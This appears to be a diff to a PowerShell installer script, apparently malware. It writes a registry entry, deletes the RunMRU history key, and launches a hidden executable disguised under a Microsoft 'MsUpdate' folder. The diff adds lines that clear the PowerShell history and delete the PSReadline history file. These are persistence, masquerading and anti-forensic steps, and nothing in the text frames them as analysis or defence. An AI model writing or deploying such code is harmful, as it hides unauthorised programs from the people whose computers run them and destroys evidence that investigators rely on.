@@ -41,10 +41,14 @@ if (-not (Test-Path "$rutaRegistro\$nombreEntrada")) {
     $null = New-ItemProperty -Path $rutaRegistro -Name $nombreEntrada -Value $valorEntrada -PropertyType String -Force
 }
 
-
 # Limpiar historial de ejecucion
 $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 Remove-Item -LiteralPath $registryPath -Force
 
 ## Execution of the client
 Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe" -ArgumentList "start" -WindowStyle Hidden
+
+# Limpiar historial Powershell
+Clear-History
+Remove-Item $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+exit
